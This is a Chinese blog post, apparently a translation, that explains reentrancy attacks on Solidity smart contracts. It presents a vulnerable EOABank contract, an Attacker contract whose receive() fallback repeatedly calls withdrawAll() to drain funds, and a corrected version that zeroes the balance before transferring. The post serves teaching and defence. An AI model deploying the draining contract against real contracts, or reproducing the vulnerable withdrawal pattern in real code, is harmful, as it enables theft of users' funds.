---
title: 智能合约中的重入攻击
description: null
author: 李留白
weight: 0
date: 2023-04-20T15:34:15.336Z
lastmod: 2023-04-20T15:45:01.932Z
tags: []
categories:
  - 区块链
featuredImage: https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/20230420234449.png
---
 
当智能合约功能通过对未知或敌对参与者编写的合约进行外部调用而暂时放弃交易的控制流时，就会发生重入攻击。这允许后一个合约对主要智能合约函数进行递归调用以耗尽其资金。

这次攻击的步骤如下：

1. 攻击者请求易受攻击的合约**X**将资金转移到恶意合约**Y**。
2. 合约**X**确定攻击者是否拥有所需资金，然后将资金转移到合约**Y**。
3. 然后攻击者执行回调函数。一旦合约**Y**收到资金，它就会执行一个回调函数，在更新账户余额之前调用合约**X。**
4. 这个递归过程一直持续到所有资金都用完并转移为止。

重入攻击最好用一个例子来说明。**考虑这个名为EOABank**的简单银行合约：

```solidity
//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.9;

contract EOABank {

    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawAll() public {
        (bool success, ) = msg.sender.call{ value: balances[msg.sender] }("");
        require(success, "Transaction failed!");
        balances[msg.sender] = 0;
    }
}
```

这个合约的作用很简单。它通过`deposit()`函数接受付款，并允许使用`withdrawAll()`函数提取所有资金。

### 这个EOABank合约如何被攻击？

考虑一下这个**攻击者**合同：

```solidity
contract Attacker {

    EOABank public exploitBank;

    constructor(address _thebankAddress) {
        exploitBank = EOABank(_thebankAddress);
    }

    // fallback
    receive() external payable {
        if (address(exploitBank).balance >= 1 ether) {
            exploitBank.withdrawAll();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        // send 1 Ether
        exploitBank.deposit{value: 1 ether}();
        // immediately withdraw
        exploitBank.withdrawAll();
    }

}
```

**该合约在部署时需要EOABank**合约的地址。它还用自己的功能覆盖`receive()`函数（通常是每个智能合约中的回退函数）。`attack()`函数是**EOABank**被攻击的地方。

让我们更详细地了解这次攻击的步骤：

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/20230420234255.png)

1. **攻击者**合约在**EOABank**存入 1 个以太币。
2. 资金立即被提取。
3. 取款触发`receive()`函数。这发生在`balances`被设置为 0 之前。
4. `receive()`函数允许执行任意代码。攻击者利用这一点，再次调用`withdrawAll()`。
5. 这里的循环在`receive()`和`withdrawAll()`之间开始，直到所有的资金被耗尽。
6. 循环。
7. 只有在所有资金都用完后，`balances`才设置为 0。

### **EOABank 的安全实施**是什么样的？

```solidity
contract EOABank {

    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawAll() public {
        // save balances in new variable
        uint256 bal = balances[msg.sender];
        // reset balances
        balances[msg.sender] = 0;
        // transfer
        (bool success, ) = msg.sender.call{ value: bal }("");
        require(success, "Transaction failed!");
    }
}
```

注意区别。首先，`balances`值保存在一个新变量`bal`中。其次，在转移价值之前将余额设置为 0。这样，**EOABank**就可以免受重入攻击。

> 原文：https://krz.hashnode.dev/re-entrancy-attacks-in-smart-contracts

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/profile.jpg)